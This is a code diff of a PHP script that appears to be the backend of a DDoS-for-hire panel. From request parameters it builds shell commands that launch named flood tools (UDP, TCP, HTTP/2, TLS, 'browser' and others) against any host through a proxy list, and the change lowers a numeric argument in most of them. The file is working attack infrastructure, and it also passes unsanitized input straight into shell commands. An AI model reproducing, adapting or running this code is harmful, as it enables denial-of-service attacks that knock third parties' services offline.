@@ -22,7 +22,7 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
 
     switch ($method) {
         case 'GLORY':
-            $command = "cd /var/www/html/test/ && screen -dm node glory $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node glory $host $time 8 2 proxy.txt";
             break;
         case 'UDP':
             $command = "cd /var/www/html/test/ && screen -dm ./udp $host $port $time";
@@ -31,37 +31,37 @@ if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'], $_GET['ke
             $command = "cd /var/www/html/test/ && screen -dm node tcpssh $host $port root $time";
             break;
         case 'H2FLOOD':
-            $command = "cd /var/www/html/test/ && screen -dm node -r bytenode loki.jsc $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node -r bytenode loki.jsc $host $time 8 2 proxy.txt";
             break;
         case 'TCP':
             $command = "cd /var/www/html/test/ && screen -dm ./tcppps $host $port 2 $time";
             break;
         case 'HTTPS':
-            $command = "cd /var/www/html/test/ && screen -dm node HTTPS $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node HTTPS $host $time 8 2 proxy.txt";
             break;
         case 'HTTP-X':
-            $command = "cd /var/www/html/test/ && screen -dm node HTTP-X $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node HTTP-X $host $time 8 2 proxy.txt";
             break;
         case 'QUANTUM':
-            $command = "cd /var/www/html/test/ && screen -dm node QUANTUM $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node QUANTUM $host $time 8 2 proxy.txt";
             break;
         case 'FLOODS':
-            $command = "cd /var/www/html/test/ && screen -dm node floods $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node floods $host $time 8 2 proxy.txt";
             break;
         case 'TLS':
-            $command = "cd /var/www/html/test/ && screen -dm node TLS $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node TLS $host $time 8 2 proxy.txt";
             break;
         case 'HOLD':
-            $command = "cd /var/www/html/test/ && pm2 start HOLD.js --name 'hold' -- $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && pm2 start HOLD.js --name 'hold' -- $host $time 8 2 proxy.txt";
             break;
         case 'BROWSER':
             $command = "cd /var/www/html/test/ && screen -dm node brow $host $time";
             break;
         case 'STORM':
-            $command = "cd /var/www/html/test/ && screen -dm node Storm $host $time 8 4 proxy.txt";
+            $command = "cd /var/www/html/test/ && screen -dm node Storm $host $time 8 2 proxy.txt";
             break;
         case 'MIX':
-            $command = "cd /var/www/html/test/ && screen -dm node MIX $host $time 8 4";
+            $command = "cd /var/www/html/test/ && screen -dm node MIX $host $time 8 2";
             break;
         case 'RAW':
             $command = "cd /var/www/html/test/ && screen -dm node HTTP-RAW $host $time";
